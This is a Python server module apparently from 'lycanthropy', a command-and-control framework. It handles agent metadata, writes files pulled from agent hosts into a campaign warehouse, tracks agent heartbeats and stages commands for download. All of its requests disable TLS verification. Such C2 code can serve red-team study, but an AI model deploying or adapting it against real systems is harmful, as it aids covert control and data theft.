import base64

import lycanthropy.sql.interface
import lycanthropy.sql.agent
import lycanthropy.sql.server
import lycanthropy.auth.client
import lycanthropy.crypto
import datetime
import requests
import hashlib
import urllib3
import json
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class apiBroker():
    def sendGet(self,uri,cookie):
        return requests.get(
            uri,
            cookies={
                '_eaid':cookie
            },
            verify=False
        )

    def sendPost(self,uri,data,cookie):
        return requests.post(
            uri,
            json=data,
            cookies={
                '_eaid':cookie
            },
            headers={
                'Content-Type': 'application/json'
            },
            verify=False
        )

    def getForm(self):
        contextFuncs = json.load(
            open(
                '../etc/control.json',
                'r'
            )
        )
        return contextFuncs

    def passGeneric(self,arguments,connector,method,jobID,pkgName):
        acid = arguments['acid']
        arguments.pop('acid')
        apiDirective = {
            'pkgName':pkgName,
            'pkgMeth':method,
            'jobID':jobID,
        }
        for object in arguments:
            apiDirective[object] = arguments[object]
        apiResponse = lycanthropy.portal.api.apiBroker().sendPost(
            'https://{}:{}/lycanthropy/api/{}'.format(
                connector['interface'],
                connector['port'],
                acid
            ),
            apiDirective,
            connector['apiCookie']
        )
        return apiResponse

class buildBroker():
    def sendPost(self,uri,data):
        return requests.post(
            uri,
            json=data
        )

class streamAccessManager():
    def __init__(self):
        self.functionMap = {
            'data':self.data
        }

    def data(self,map,reducer,roles,campaigns,identity):

        finalObj = {}
        for retrObj in map:
            if retrObj[reducer['filter']['field']] == reducer['filter']['value'] or 'ROTID' in retrObj['jobID']:
                if retrObj['campaign'] in campaigns and identity not in retrObj['tags']:
                    finalObj['state'] = 'true'
                    finalObj['output'] = retrObj
                    finalObj['stream'] = reducer['stream']
                    return finalObj
        return {'state':'false'}

class dataProcessingHandlers():
    def __init__(self):
        #break this out to a separate dir to make it more accessibly modular
        self.functionMap = {
            'metadata':self.metadata,
            'control':self.control,
            'windows':self.windows,
            'posix':self.posix
        }

    def metadata(self,campaign,data):
        #lycanthropy.sql.agent.storeMeta(acid,hostname,ip,os,arch,integrity,user,cwd,domain,registered)
        verification = verifyMetadata(data)
        if verification == 0:
            lycanthropy.sql.agent.storeMeta(
                data['acid'],
                data['hostname'],
                data['ip'],
                data['os'],
                data['arch'],
                data['integrity'],
                data['user'],
                data['cwd'],
                data['domain'],
                timestamp()
            )
            return '{"streamStatus":"complete"}'
        elif verification == 1:
            lycanthropy.sql.server.updateStatus(data['acid'],'active')
            lycanthropy.sql.server.updateJob(data['acid'],data['jobID'])
            return '{"streamStatus":"complete"}'
        elif verification == 2:
            return '{"streamStatus":"AccessDeniedError"}'

    def control(self,campaign,data):
        print(
            data['module']
        )
        if data['module'] == 'filePull':
            fileData = data['output'].split('|')
            fileBytes = base64.b64decode(fileData[1])
            recvFile = open('campaign/{}/warehouse/{}'.format(campaign,fileData[0]),'wb')
            recvFile.write(fileBytes)
            recvFile.close()
            data['output'] = 'successfully uploaded {} to the campaign warehouse'.format(fileData[0])

        lycanthropy.sql.agent.storeData(
            campaign,
            data['acid'],
            data['module'],
            timestamp(),
            data['jobID'],
            data['output']
        )
        return '{"streamStatus":"complete"}'

    def windows(self,campaign,data):
        lycanthropy.sql.agent.storeData(
            campaign,
            data['acid'],
            data['module'],
            timestamp(),
            data['jobID'],
            data['output']
        )
        return '{"streamStatus":"complete"}'

    def posix(self,campaign,data):
        lycanthropy.sql.agent.storeData(
            campaign,
            data['acid'],
            data['module'],
            timestamp(),
            data['jobID'],
            data['output']
        )
        return '{"streamStatus":"complete"}'


def timestamp():
    currently = datetime.datetime.now()
    return currently.strftime('%Y%m%dT%H.%M.%S')


def config(confKey,acid):
    try:
        config = lycanthropy.sql.interface.filterBuild({'tempAcid':acid,'confKey':confKey})[0]
        return {'config':config,'error':False}
    except Exception as e:

        return {'config':None, 'error':True}


def data(campaign,data):
    #store in db
    return dataProcessingHandlers().functionMap[data['class']](
        campaign,
        data
    )
    #if 'ROTID' in data['jobID']:

    #else:
    #    lycanthropy.sql.agent.storeData(
    #        campaign,
    #        data['acid'],
    #        data['module'],
    #        timestamp(),
    #        data['jobID'],
    #        data['output']
    #    )
    #    return '{"streamStatus":"complete"}'

def verifyMetadata(data):
    dangerZones = ['hostname', 'ip', 'arch', 'os']
    agents = lycanthropy.sql.interface.filterAgents({})
    for agent in agents:
        if agent['acid'] == data['acid']:
            for field in dangerZones:
                if data[field] != agent[field]:
                    return 2
            return 1
    return 0

def chkFieldDefaults(context,granular,arguments):
    consoleFuncs = json.load(
        open(
            '../etc/console.json',
            'r'
        )
    )
    defaultFieldMatches = []
    contextFields = json.load(
        open(
            '../etc/{}.json'.format(context.split('(')[0]),
            'r'
        )
    )
    if granular in consoleFuncs:
        return {'defaults':[]}
    for argument in contextFields[granular]['arguments']:
        if contextFields[granular]['arguments'][argument] == arguments[argument]:
            if argument in contextFields[granular]['required']:
                return {'error':'no value provided for {} in directive {}'.format(argument,granular),'defaults':[]}
            else:
                defaultFieldMatches.append(argument)
    else:
        return {'defaults':defaultFieldMatches}

def taskMetadata(config):
    return {
        'jobID':'{}{}'.format('ROTID',lycanthropy.crypto.mkRandom(6)),
        'pkgMeth':'collectMeta',
        'pkgName':'metadata'
    }


def pushDataEvent(data,token,connector,campaignMemberShip):
    data['campaign'] = campaignMemberShip
    uri = '/lycanthropy/data-handler/1/data'
    response = requests.post(
        'https://{}:{}{}'.format(connector['interface'],connector['port'],uri),
        headers={'content-type': 'application/json'},
        json=data,
        cookies={
            '_lmt':token,
            '_eaid':connector['apiCookie']
        },
        verify=False
    )
    return response.content.decode('utf-8')

def getHash(data):
    hashifer = hashlib.sha256()
    hashifer.update(data.encode('utf-8'))
    return hashifer.hexdigest()

def subscribeMonitor(user,config,remote,identity):
    subscription = {}
    subscription['token'] = lycanthropy.auth.client.monitoringToken(user,config,remote,identity)
    subscription['filters'] = []
    subscription['tasks'] = []
    subscription['user'] = user
    return subscription


def returnMonitoringStream(map,monitor,identity,reducer):
    #manage the filterint process of monitoring data
    userData = lycanthropy.sql.interface.filterUser({'username':monitor['user']})[0]
    roles = userData['roles'].split(',')
    campaigns = userData['campaigns'].split(',')
    return streamAccessManager().functionMap[reducer['stream']](map,reducer,roles,campaigns,identity)

def getSubscriptionObjects(apiUser,config,token,remote,identity,objType):
    subObjects = {'partitions': lycanthropy.auth.client.getCampaignAccess(
        apiUser,
        config,
        token,
        remote,
        identity
    ),
    'agents':lycanthropy.sql.interface.filterAgents({}),
    'builds':lycanthropy.sql.interface.filterBuild({})}
    if objType == 'campaigns':
        return {'partitions':subObjects['partitions']}
    elif objType == 'agents':
        availableAcids = {'agents':[]}
        for acidic in subObjects['agents']:
            for build in subObjects['builds']:
                if build['acid'] == acidic['acid']:
                    if build['campaign'] in subObjects['partitions']:
                        availableAcids['agents'].append(acidic)
        return availableAcids
    elif objType == 'builds':
        availableBuilds = {'builds':[]}
        for build in subObjects['builds']:
            if build['campaign'] in subObjects['partitions']:
                availableBuilds['builds'].append(
                    {
                        'campaign':build['campaign'],
                        'acid':build['acid'],
                        'pkgCore':build['pkgCore'].split(',')
                    }
                )
        return availableBuilds

def updateAgentStates(heartbeats):
    for agent in heartbeats:
        diff = (int(time.time()) - heartbeats[agent])
        if diff > 300 and diff < 1800:
            lycanthropy.sql.server.updateStatus(
                agent,
                'indeterminate'
            )
        elif diff > 1800:
            lycanthropy.sql.server.updateStatus(
                agent,
                'lost'
            )

def restoreForm(command,context,arguments):
    fmtContext = context.split('(')[0]
    consoleFuncs = json.load(
        open(
            '../etc/console.json',
            'r'
        )
    )
    contextFuncs = json.load(
        open(
            '../etc/{}.json'.format(fmtContext),
            'r'
        )
    )
    if command in consoleFuncs:
        contextFuncs = consoleFuncs
    commandForm = contextFuncs[command]
    for object in arguments:
        commandForm['arguments'][object] = arguments[object]
    return {command:commandForm['arguments']}

def accessChk(connector,role):
    apiUser = connector['apiToken']['user']
    userData = lycanthropy.sql.interface.filterUser({'username': apiUser})[0]
    if role not in userData['roles'].split(','):
        return False
    return True

def stageScript(command,jobID,acid):
    #stage longer commands as a downloadable
    parentPartition = lycanthropy.portal.categorize.find(acid)
    scrObj = open('campaign/{}/docroot/{}'.format(parentPartition,jobID),'w')
    scrObj.write(command)
    scrObj.close()

def chkSatisfied(jobItem,acid):
    #check if the job has run already
    if jobItem['pkgName'] == 'metadata':
        acidMeta = lycanthropy.sql.interface.filterAgents({'acid': acid})
        if len(acidMeta) == 0:
            return False
        else:
            if acidMeta[0]['status'] == 'active':
                return True
            else:
                return False
    else:
        acidData = lycanthropy.sql.interface.filterData({'job':jobItem['jobID']})
        if len(acidData) == 0:
            return False
        else:
            return True
